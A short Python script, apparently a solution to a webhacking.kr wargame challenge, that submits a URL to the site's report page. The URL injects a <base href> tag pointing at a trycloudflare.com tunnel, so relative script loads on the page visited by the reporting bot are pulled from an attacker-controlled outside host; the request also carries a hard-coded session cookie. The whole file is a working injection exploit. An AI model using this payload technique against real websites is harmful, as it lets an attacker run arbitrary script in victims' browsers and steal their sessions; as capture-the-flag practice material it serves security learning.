import requests

URL = "http://webhacking.kr:10010/report.php"
PAYLOAD = "?inject=<base href='https://spaces-adjustments-extremely-distance.trycloudflare.com/'>"
DATA = {
    "url" : PAYLOAD
}
COOKIES = {
    "PHPSESSID": "0n7rge2jksvhu5np9cj6futrlk"
}

resp = requests.post(url = URL, data = DATA, cookies = COOKIES)

print(resp.text)
